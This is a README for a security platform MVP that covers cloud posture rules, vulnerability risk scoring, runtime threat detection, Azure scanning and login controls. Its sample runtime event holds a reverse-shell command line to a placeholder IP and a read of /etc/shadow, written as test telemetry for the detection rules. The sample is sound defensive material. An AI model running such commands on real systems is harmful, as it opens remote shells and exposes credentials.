# CloudSecurity: runtime-first CNAPP (MVP)

A cloud security platform MVP inspired by runtime-first CNAPPs such as Upwind. It combines:

- **Asset inventory**: VMs, storage accounts, AKS clusters and pods, SQL servers and databases, NSGs, identities, key vaults, function apps and subscriptions, with region, tags, internet exposure, data sensitivity and relationships.
- **Posture management (CSPM)**: a declarative rules engine with 21 rules mapped to CIS Azure and CIS AKS controls. Each finding has a status of open, resolved or suppressed.
- **Vulnerabilities with runtime context**: CVEs on packages are ranked by a risk score that combines CVSS with whether the package is loaded at runtime, internet exposure, sensitive-data reach and exploit availability. The UI shows a **noise-reduction** stat.
- **Runtime threat detection (CDR)**: a runtime event feed plus 8 detection rules (reverse shell, crypto miner, known-malicious IP, shell in a container, privilege escalation, credential-file access, unexpected outbound connection, IMDS token theft). Each rule maps to MITRE ATT&CK, and each alert has an event timeline.
- **Attack paths**: a risk graph covering Internet → exposed resource → vulnerable workload → identity → sensitive data, with the top paths ranked.
- **Dashboard**: overall risk score, findings by severity, top risks, alerts over time and a compliance summary.
- **Simulated data mode (on by default)**: a seeded "Contoso" environment across three Azure-style subscriptions, plus a background simulator that emits live runtime events.
- **Real Azure posture connector (opt-in, read-only)**: uses the azure-identity and azure-mgmt-* SDKs. A "Run scan" button merges the results into the same model with `source="azure"`.
- **Login, sessions and role-based access control**: every API endpoint and page requires sign-in (viewer, analyst or admin roles), with an admin Users page and an audit log. See [Authentication & access control](#authentication--access-control).
- **Pluggable connectors** and a documented **runtime sensor ingest API** so a real eBPF sensor, AWS or GCP can be added later.

## Architecture

```mermaid
flowchart LR
  subgraph Sources
    SIM[Simulated connector<br/>seed + live event simulator]
    AZ[Azure connector<br/>read-only, Reader role]
    SENSOR[Runtime sensor<br/>sensor/, procfs + optional eBPF]
  end
  subgraph Backend [FastAPI backend]
    ING[Ingest service]
    PR[Posture rules engine]
    DR[Detection rules engine]
    RS[Risk scoring]
    AP[Attack path engine]
    DB[(SQLite or PostgreSQL<br/>via SQLAlchemy + Alembic)]
    API[REST API /api/*]
  end
  UI[React + Vite UI]

  SIM --> ING
  AZ --> ING
  SENSOR -- POST /api/runtime/events --> DR
  ING --> PR --> DB
  ING --> RS --> DB
  DR --> DB
  DB --> AP --> API
  DB --> API
  API --> UI
```

```
backend/
  app/
    main.py              FastAPI app, lifespan (seeding + simulator + bootstrap admin)
    config.py            env-var settings
    auth.py              password hashing, sessions, CSRF, RBAC dependencies, audit helper
    cli.py               `python -m app.cli create-user | reset-password | migrate`
    db.py, locks.py      engine (SQLite/PostgreSQL), migrations, advisory-lock leader election
    logging_setup.py     text / JSON logging
    models.py            Asset, Relationship, Finding, Vulnerability, RuntimeEvent, Alert, ScanRun,
                         User, UserSession, AuditLog
    schemas.py           Pydantic v2 schemas (includes the runtime event schema)
    engine/
      posture.py         declarative CSPM rules + CIS mappings
      detection.py       CDR detection rules + MITRE mapping
      risk.py            vulnerability risk score, noise reduction, overall risk score
      attack_paths.py    graph traversal and path scoring
    connectors/
      base.py            Connector interface + records
      simulated.py       seed generator + attack scenarios
      azure.py           read-only Azure scanner (ReadOnlyClient guard)
    services/            ingest, runtime, scans, simulation, analytics
    api/                 routers
  migrations/            Alembic migrations (PostgreSQL)
  gunicorn.conf.py       production server settings
  tests/                 pytest suite (API, auth/RBAC, engines, DB, production config, sensor end-to-end)
frontend/                React + Vite + TypeScript + Tailwind + Recharts (nginx/ = production proxy config)
infra/                   Bicep (main.bicep + modules/), setup.sh (one-time Azure/GitHub setup), deploy.sh (CD step), tests
docs/DEPLOY_AZURE.md     Azure deployment guide
scripts/smoke_test.py    end-to-end smoke test (CI and the deploy workflow)
docker-compose.yml       local stack (SQLite); docker-compose.postgres.yml adds PostgreSQL
```

## Deploy to Azure

A production deployment on **Azure Container Apps + Azure Database for PostgreSQL + Key Vault**, provisioned with Bicep and deployed by a GitHub Actions workflow that signs in with OIDC (no stored Azure secrets), is described step by step in **[docs/DEPLOY_AZURE.md](docs/DEPLOY_AZURE.md)**: one-time `infra/setup.sh`, then run the *Deploy to Azure* workflow. Estimated cost for the demo sizing is roughly **US$35-45/month**; `az group delete` removes everything.

## Quick start

### With Docker

```bash
cp .env.example .env        # then set ADMIN_EMAIL and ADMIN_PASSWORD (12+ characters)
docker compose up --build
```

The compose stack runs the same production images as Azure (gunicorn with uvicorn workers, unprivileged nginx). To use PostgreSQL instead of SQLite, as in production:

```bash
export POSTGRES_PASSWORD=$(openssl rand -hex 16)   # any local-only value
docker compose -f docker-compose.yml -f docker-compose.postgres.yml up --build
```

To also run the runtime sensor against the Docker host (Linux only), set `INGEST_API_TOKEN` in `.env` and start the optional profile:

```bash
docker compose --profile sensor up --build
```

- UI: http://localhost:5173 (sign in with `ADMIN_EMAIL` / `ADMIN_PASSWORD`)
- API docs (after signing in to the UI; cookies are shared across localhost ports): http://localhost:8000/api/docs

### Without Docker

Backend (Python 3.11+):

```bash
cd backend
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements-dev.txt
# First admin (only used while the users table is empty). Or use the CLI below.
export ADMIN_EMAIL=you@example.com ADMIN_PASSWORD='choose-a-long-passphrase'
uvicorn app.main:app --reload --port 8000
```

Frontend (Node 22.15+; the ESLint config uses `module.registerHooks`), in a second terminal:

```bash
cd frontend
npm install
npm run dev                 # http://localhost:5173 (proxies /api to :8000)
```

Run the tests and the production build:

```bash
cd backend && pytest && ruff check .
cd frontend && npm run lint && npm run build
```

The backend suite runs on in-memory SQLite by default. To run it against PostgreSQL as CI does (the database is wiped repeatedly):

```bash
TEST_DATABASE_URL=postgresql://cnapp:<password>@localhost:5432/cnapp_test pytest
```

### Database migrations

SQLite (local default) keeps the zero-setup behaviour: tables are created on startup. PostgreSQL is managed by Alembic migrations in `backend/migrations/`, applied automatically on startup (`DB_AUTO_MIGRATE=true`, under a PostgreSQL advisory lock so several replicas can start together) or explicitly with `python -m app.cli migrate`. After changing `app/models.py`, add a migration:

```bash
cd backend
DATABASE_URL=postgresql://... alembic revision --autogenerate -m "describe the change"
```

`tests/test_database.py` fails if the migrations and the models drift apart.

On first start, simulated mode seeds the database (`backend/cnapp.db`) and backfills 24 hours of runtime events. To start fresh, delete the DB file.

## Configuration (env vars)

| Variable | Default | Description |
|---|---|---|
| `APP_ENV` | `development` | `production` enables the [production guardrails](docs/DEPLOY_AZURE.md#production-settings): refuses to start if insecure, JSON logs, HSTS, no API docs |
| `DATABASE_URL` | `sqlite:///./cnapp.db` | SQLAlchemy URL. `postgresql://user:pass@host:5432/db?sslmode=verify-full` uses psycopg 3 |
| `DB_AUTO_MIGRATE` | `true` | Apply schema migrations on startup (Alembic on PostgreSQL, `create_all` on SQLite) |
| `DB_POOL_SIZE` / `DB_MAX_OVERFLOW` | `5` / `5` | PostgreSQL connection pool per worker process |
| `LOG_FORMAT` / `LOG_LEVEL` | `text` (`json` in production) / `INFO` | Log output format and level |
| `WEB_CONCURRENCY` | `2` | gunicorn worker processes in the container image |
| `SIMULATION_MODE` | `true` | Seed the simulated environment when the DB is empty |
| `SIMULATOR_ENABLED` | `true` | Run the background runtime-event simulator |
| `SIMULATOR_INTERVAL_SECONDS` | `15` | Seconds between simulator ticks |
| `SIMULATOR_ATTACK_PROBABILITY` | `0.05` | Chance that a tick plays out an attack scenario |
| `SEED` | `42` | Deterministic seed for generated data |
| `INGEST_API_TOKEN` | *(empty)* | Bearer token required on `POST /api/runtime/events` (the sensor's `SENSOR_API_TOKEN`). Ingest is **fail-closed**: unset means 503. `RUNTIME_INGEST_TOKEN` is accepted as a legacy alias |
| `INGEST_ALLOW_UNAUTHENTICATED` | `false` | Local development only: accept sensor events without a token |
| `MAX_REQUEST_BYTES` | `1048576` | Request body limit for every endpoint (413 above it) |
| `MAX_EVENTS_PER_REQUEST` | `1000` | Max events per ingest request |
| `CORS_ORIGINS` | `http://localhost:5173` | Comma-separated allowed origins |
| `ADMIN_EMAIL` / `ADMIN_PASSWORD` | | Create this admin on startup **only if no users exist**. Password must be 12+ characters. There is no default password |
| `ADMIN_NAME` | `Administrator` | Display name for the bootstrap admin |
| `COOKIE_SECURE` | `true` | Mark the session cookie `Secure`. Leave on for https and Codespaces; see [Cookies](#session-cookie-settings) |
| `SESSION_MAX_AGE_HOURS` | `8` | Absolute session lifetime |
| `SESSION_IDLE_MINUTES` | `30` | Sign out after this long without any API activity |
| `SESSION_COOKIE_NAME` | `cnapp_session` | Session cookie name |
| `LOGIN_MAX_FAILURES` / `LOGIN_LOCKOUT_MINUTES` | `5` / `15` | Lock an account for 15 minutes after 5 consecutive wrong passwords |
| `LOGIN_RATE_LIMIT` / `LOGIN_RATE_WINDOW_SECONDS` | `20` / `300` | Max login attempts per client IP per window (429 above it) |
| `TRUST_PROXY_HEADERS` | `false` | Take the client IP from the right-most `X-Forwarded-For` entry. Only enable when the backend is reachable *only* through your proxy |
| `TRUSTED_PROXY_CIDRS` | | With `TRUST_PROXY_HEADERS`: honour `X-Forwarded-For` only from these proxies and use the right-most address that is not one of them (several proxy hops, e.g. Container Apps ingress + nginx) |
| `SESSION_SECRET` | | Key for the stored session-token digests (HMAC-SHA256). Required (32+ chars) in production; rotating it signs everyone out |
| `API_DOCS_ENABLED` | `true` (`false` in production) | Serve the interactive API docs at all |
| `API_DOCS_PUBLIC` | `false` | Serve `/api/docs` and `/api/openapi.json` without login |
| `HSTS_MAX_AGE` | `31536000` | `Strict-Transport-Security` max-age sent in production (0 disables) |
| `AZURE_TENANT_ID` | | Entra ID tenant |
| `AZURE_CLIENT_ID` | | Service principal app ID |
| `AZURE_CLIENT_SECRET` | | Service principal secret |
| `AZURE_SUBSCRIPTION_IDS` | | Comma-separated subscriptions to scan |
| `AZURE_USE_DEFAULT_CREDENTIAL` | `false` | Use `DefaultAzureCredential` (az login, managed identity) when no secret is set |
| `AZURE_AUTH_MODE` | `auto` | `auto`, `client_secret`, `managed_identity` or `default`. `auto` uses the client secret if set, else the managed identity if `AZURE_MANAGED_IDENTITY_CLIENT_ID` is set, else `DefaultAzureCredential` if enabled |
| `AZURE_MANAGED_IDENTITY_CLIENT_ID` | | Client ID of the user-assigned managed identity to scan with (set by the Azure deployment) |

## Connecting a real Azure environment (read-only)

**Deployed on Azure:** the scanner uses the backend's managed identity, so there is no secret at all. Grant it Reader with `infra/setup.sh --grant-scanner <subscription-id>` and redeploy; see [Enable the Azure scanner](docs/DEPLOY_AZURE.md#enable-the-azure-scanner). The steps below are for running the scanner **locally** with a service principal secret.

1. Create a least-privilege service principal with the built-in **Reader** role:

```bash
az login
SUB_ID=$(az account show --query id -o tsv)

az ad sp create-for-rbac \
  --name cloudsecurity-cnapp-reader \
  --role Reader \
  --scopes /subscriptions/$SUB_ID
# Output: appId -> AZURE_CLIENT_ID, password -> AZURE_CLIENT_SECRET, tenant -> AZURE_TENANT_ID
```

2. To scan more subscriptions, grant Reader on each one:

```bash
az role assignment create --assignee <appId> --role Reader --scope /subscriptions/<other-sub-id>
```

3. Optional: grant Reader at a management group to cover many subscriptions:

```bash
az role assignment create --assignee <appId> --role Reader \
  --scope /providers/Microsoft.Management/managementGroups/<mg-id>
```

4. Put the values in `.env`, which is git-ignored, and restart the backend:

```bash
AZURE_TENANT_ID=<tenant>
AZURE_CLIENT_ID=<appId>
AZURE_CLIENT_SECRET=<password>
AZURE_SUBSCRIPTION_IDS=<sub-id-1>,<sub-id-2>
```

5. Open **Connectors & scans** and click **Run scan**, or call `POST /api/scans` with `{"connector":"azure"}`. Results appear in the inventory and findings with `source=azure`. A re-scan resolves findings that now pass.

What the scanner checks:

- **Storage**: public blob access, HTTPS-only, minimum TLS version.
- **NSGs**: inbound rules allowing 0.0.0.0/0 on 22, 3389 or any port.
- **VMs**: public IPs; no ADE, encryption-at-host or CMK.
- **SQL**: public network access, auditing disabled, a 0.0.0.0–255.255.255.255 firewall rule.
- **Key Vault**: soft delete and purge protection.
- **AKS**: RBAC disabled, public API server without authorized IP ranges.
- **Function apps**: HTTPS-only.
- **Identities**: Owner or Contributor at subscription scope.
- **Subscription**: owner and contributor counts.

Relationships come from NICs (VM↔NSG), VM identities, and RBAC role assignments (identity → data store). Data stores are marked sensitive through tags such as `data-classification`, `classification`, `sensitivity` or `data`. Key vaults and SQL are always treated as sensitive.

**Read-only guarantee:** every SDK client is wrapped in `ReadOnlyClient`, which only allows `list*` and `get*` operations and raises `ReadOnlyViolation` on anything else (`begin_*`, `create*`, `update`, `delete`, ...). Tests enforce this, and the Reader role enforces it again on the Azure side.

## Authentication & access control

Every `/api/*` endpoint requires a signed-in user, except:

- `GET /api/health` (liveness probe),
- `POST /api/auth/login`,
- `POST /api/runtime/events`, which keeps its own `Authorization: Bearer <INGEST_API_TOKEN>` sensor authentication (user sessions are not accepted there).

The interactive API docs moved to `/api/docs` (`/api/openapi.json`), so they work through the frontend's `/api` proxy, and they also require sign-in unless `API_DOCS_PUBLIC=true`. `/docs` redirects there.

### First sign-in (bootstrap admin)

No user and no password is ever seeded. Create the first admin in one of two ways:

1. **Environment variables**: set `ADMIN_EMAIL` and `ADMIN_PASSWORD` (12+ characters) before starting the backend. The admin is created at startup **only when the users table is empty**; afterwards the variables are ignored (you can, and should, remove `ADMIN_PASSWORD` once you have signed in and changed the password).
2. **CLI** (prompts for the password twice, so it never lands in shell history):

   ```bash
   cd backend
   python -m app.cli create-user --email you@example.com --name "Your Name" --role admin
   python -m app.cli reset-password --email you@example.com   # also unlocks and reactivates
   ```

   With Docker: `docker compose exec backend python -m app.cli create-user --email you@example.com --role admin`.

Then open the UI, sign in, and add other users under **Administration → Users**.

### Roles

| Role | Can |
|---|---|
| `viewer` | Read everything: dashboard, inventory, findings, vulnerabilities, threats, attack paths, connectors, scan history |
| `analyst` | Viewer, plus suppress / resolve / reopen findings, acknowledge / resolve alerts, and run connector scans |
| `admin` | Everything, including user management (create, change role, deactivate, reset password), the audit log and connector settings |

The UI hides or disables actions the signed-in role cannot perform; the API enforces the same rules (403). The last active admin cannot be demoted or deactivated.

### Passwords, lockout and rate limiting

- Passwords are hashed with **Argon2id** (`argon2-cffi`) and must be 12 to 256 characters.
- Failed sign-ins always return the same `Invalid email or password` message, and unknown or inactive accounts still run a dummy hash verification so response times do not reveal which emails exist.
- After `LOGIN_MAX_FAILURES` (5) consecutive wrong passwords an account is locked for `LOGIN_LOCKOUT_MINUTES` (15). Admins can unlock early with *Reset password*.
- Each client IP gets `LOGIN_RATE_LIMIT` (20) attempts per `LOGIN_RATE_WINDOW_SECONDS` (300); above that, login returns 429. The limiter is in-memory (single process, like the rest of the MVP). Behind a proxy (Vite dev server, nginx, Codespaces) every request comes from the proxy's address unless `TRUST_PROXY_HEADERS=true`, so the limit is then effectively shared by all clients; per-account lockout still applies individually.
- Changing your password signs out your other sessions; an admin password reset or deactivation signs out all of that user's sessions.

### Sessions and CSRF

- Sign-in creates a row in the server-side `user_sessions` table and sets a random 256-bit token in the `cnapp_session` cookie (`HttpOnly`, `SameSite=Lax`, `Path=/`, `Secure` unless `COOKIE_SECURE=false`). Only the SHA-256 of the token is stored.
- Sessions end after `SESSION_MAX_AGE_HOURS` (8 h, absolute) or `SESSION_IDLE_MINUTES` (30 min) without API activity. **Sign out** revokes the session server-side, so a copied cookie stops working.
- **CSRF** uses a synchronizer token: each session has its own random CSRF token, returned by `POST /api/auth/login` and `GET /api/auth/me` and kept in memory by the frontend (never in `localStorage`). Every `POST`/`PATCH`/`PUT`/`DELETE` authenticated by the cookie must send it in the `X-CSRF-Token` header, otherwise 403. A cross-site page cannot read the token, cannot send a custom header without a CORS preflight (which is not granted), and `SameSite=Lax` already keeps the cookie off cross-site sub-requests. `POST /api/auth/login` only accepts `application/json`, which a cross-site HTML form cannot send, to prevent login CSRF.
- When the session expires the UI returns to the sign-in page with a "session expired" notice and, after signing in, back to the page you were on. A 403 shows a "Not permitted" banner.

### Audit log

`audit_log` records sign-in success and failure (with the reason: unknown user, bad password, locked, inactive, rate limited), sign-out, password changes and resets, user creation and changes (with before/after values), the bootstrap admin, and analyst actions (finding and alert status changes, scans). Admins can browse it under **Administration → Audit log** or `GET /api/audit-log`.

### Session cookie settings

The browser only ever talks to the frontend origin: the Vite dev server (`npm run dev`) and the bundled nginx both proxy `/api` to the backend. The session cookie is therefore **same-origin** and no CORS or third-party-cookie setup is needed.

| How you open the UI | `COOKIE_SECURE` |
|---|---|
| `https://…` (production, GitHub Codespaces) | `true` (default) |
| `http://localhost:5173` | `true` works in Chrome, Edge and Firefox, which treat `localhost` as a secure context. If your browser drops the cookie (you get sent back to the sign-in page right after signing in), set `false` |
| `http://<some-ip-or-hostname>` (plain http, not localhost) | `false` (local testing only) |

If you serve the UI from a different origin than the API (not the default), add that origin to `CORS_ORIGINS`; credentials are allowed for listed origins (never for `*`).

### Running in GitHub Codespaces

1. In the codespace terminal, start the backend with a bootstrap admin:

   ```bash
   cd backend
   python -m venv .venv && source .venv/bin/activate
   pip install -r requirements-dev.txt
   ADMIN_EMAIL=you@example.com ADMIN_PASSWORD='choose-a-long-passphrase' \
     uvicorn app.main:app --reload --port 8000
   ```

2. In a second terminal, start the frontend:

   ```bash
   cd frontend
   npm ci
   npm run dev
   ```

   Codespaces opens forwarded ports as `https://<codespace>-5173.app.github.dev`. Vite rejects unknown `Host` headers, so the config allows `.app.github.dev` automatically when the `CODESPACES` env var is `true` (it is inside a codespace). Elsewhere, or if you have overridden it, start Vite with `__VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS=.app.github.dev npm run dev`.

3. Open the **5173** port from the *Ports* tab (you do not need to forward or expose 8000: Vite proxies `/api` to it inside the codespace) and sign in with `ADMIN_EMAIL` / `ADMIN_PASSWORD`.

Keep `COOKIE_SECURE=true` (the default): the browser sees the forwarded URL as https, so it stores the `Secure` cookie even though the hop from the Codespaces proxy to Vite and on to uvicorn is plain http. The cookie has no `Domain` attribute, so it is bound to your codespace's 5173 hostname only.

## Runtime sensor event schema

The runtime sensor in [`sensor/`](sensor/README.md) pushes events to `POST /api/runtime/events` with `Authorization: Bearer $INGEST_API_TOKEN`. The endpoint accepts a single event, a JSON array, or the sensor envelope `{"events": [...]}`, up to 1,000 events / 1 MiB. Both JSON schemas are at `GET /api/runtime/schema`.

**Native sensor schema v1.0** (default; see [`sensor/EVENT_SCHEMA.md`](sensor/EVENT_SCHEMA.md)) is recognised by its `schema_version` field. The backend:

- maps `network_connect`/`network_accept` to `network_connection` and `privilege_change` to `privilege_escalation`, and runs the same CDR rules as simulated events (plus CDR-009, a fallback for events the sensor marks `high`/`critical`);
- links events to inventory assets by Kubernetes pod name and namespace, then `cloud.resource_id` (ARM id), then VM name = `host`;
- de-duplicates on `event_id`, so sensor retries never double-count;
- uses `library_loaded` events to set the vulnerability **in use at runtime** flag (package and version match, with distro/soname aliases such as `libssl3` to `openssl`) and re-scores risk. The flag expires if the sensor's hourly heartbeat stops for 3 hours. Events show up in the UI tagged `sensor`, next to `sim` events.

**Legacy format** (used by the built-in simulator and the sensor's `cnapp-mvp` mode):

```jsonc
{
  "timestamp": "2026-10-14T12:00:00Z",          // optional; defaults to receipt time
  "asset_id": "/subscriptions/.../pods/web-1",  // inventory asset id (ARM id / pod id)
  "event_type": "process_exec",                 // process_exec | network_connection | file_access | privilege_escalation
  "sensor_id": "node-7-ebpf",
  "process":   {"name": "bash", "cmdline": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
                "pid": 4242, "ppid": 1, "parent_name": "java", "user": "app", "uid": 1000},
  "network":   {"direction": "outbound", "protocol": "tcp", "dst_ip": "1.2.3.4", "dst_port": 4444},
  "file":      {"path": "/etc/shadow", "operation": "read"},
  "privilege": {"from_uid": 1000, "to_uid": 0, "method": "setuid"},
  "container": {"id": "abc123", "name": "web", "image": "acr.io/web:1.2", "pod": "web-1", "namespace": "shop"},
  "labels":    {"node": "aks-node-7"}
}
```

Example:

```bash
curl -X POST localhost:8000/api/runtime/events \
  -H "Authorization: Bearer $INGEST_API_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"event_type":"network_connection","network":{"dst_ip":"185.220.101.47","dst_port":443}}'
```

The response lists the alerts triggered. Repeated hits of the same rule on the same asset within 30 minutes are grouped into one alert.

## Risk scoring

```
risk = 100 × (cvss/10) × runtime × context
runtime = 1.0 if the package is loaded at runtime, else 0.2
context = 0.4 + 0.25·internet_exposed + 0.20·exploit_available + 0.15·sensitive_data_access
```

A dormant vulnerability can never score above 20. An in-use, exposed vulnerability with CVSS ≥ 5 always scores at least 32.5, so it ranks above any dormant one. **Noise reduction** is the share of vulnerabilities in packages that are not loaded at runtime.

## Extending

- **New cloud provider**: implement `app/connectors/base.py::Connector` (`is_configured`, `collect`) and register it in `app/connectors/__init__.py`. Normalize resources onto the existing asset types and property names so the posture rules apply unchanged, or add rules for new types.
- **New posture rule**: add a function decorated with `@rule(...)` in `app/engine/posture.py`.
- **New detection**: add a function decorated with `@detection(...)` in `app/engine/detection.py`.

## Security notes

- No secrets are committed. Only `.env.example` is tracked; `.env`, `*.pem`, `*.key` and local DB files are git-ignored.
- The Azure connector is strictly read-only (Reader role plus the code-level guard).
- The sensor ingest endpoint requires a bearer token (`INGEST_API_TOKEN`) and is disabled when none is set. Request bodies are capped (`MAX_REQUEST_BYTES`) and every event field is length and range checked.
- Every other API endpoint requires a signed-in user with the right role (see [Authentication & access control](#authentication--access-control)): Argon2id passwords, server-side sessions in an `HttpOnly` / `SameSite=Lax` / `Secure` cookie, CSRF tokens on state-changing requests, account lockout, per-IP login rate limiting and an audit log.
- The Azure guard also blocks `list*`/`get*` operations that return secrets (`list_keys`, SAS tokens, AKS credentials).
- Do not commit the SQLite DB if you have run real scans; it contains your cloud inventory.

## Roadmap

- Wider eBPF coverage in the runtime sensor (file access attribution, accept/privilege events without polling).
- **AWS** and **GCP** connectors.
- **DSPM**: data discovery and classification instead of tag-based sensitivity.
- **API security**: discovery of exposed APIs and runtime API traffic analysis.
- **CI/CD shift-left**: IaC scanning and image scanning in pipelines, linked to the runtime findings.
- SSO (OIDC/SAML), MFA and multi-tenancy; a real vulnerability scanner feed (for example Trivy or Grype); more CIS controls.

## Limitations (MVP)

- Vulnerability data and runtime events in simulated mode are synthetic. The Azure connector covers posture only; it has no runtime or CVE data.
- CIS control numbers are approximate mappings for illustration.
- On PostgreSQL the backend can run several replicas/workers (the simulator and scans use advisory-lock leader election), but the login rate limiter is in-memory: it resets on restart and counts per worker process, so the effective limit is `LOGIN_RATE_LIMIT` x workers x replicas. Per-account lockout is stored in the database and is exact.
- No SSO or MFA yet; passwords are the only sign-in method.
